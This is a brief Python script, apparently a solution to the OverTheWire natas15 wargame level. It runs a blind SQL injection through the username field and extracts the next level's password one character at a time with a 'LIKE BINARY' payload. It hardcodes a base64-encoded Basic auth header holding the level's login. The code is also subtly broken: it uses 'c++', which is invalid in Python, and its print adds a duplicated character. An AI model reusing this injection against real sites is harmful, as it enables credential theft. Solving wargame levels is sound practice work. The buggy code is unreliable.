import requests
from requests.auth import HTTPBasicAuth
chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890' #List of possible characters
auth=HTTPBasicAuth('natas15','') #Credentials to access the page/send the request, add the password for natas15 in the second parameter
pw='' #String to store the found correct password characters
c=0 #Number of correct password characters found
print()
while c<32:
	for i in chars:
		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #' #SQL payload
		dat={'username':val}
		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
		if "This user exists" in str(req.content):
			pw=pw+i
			print(pw + i)
			c++
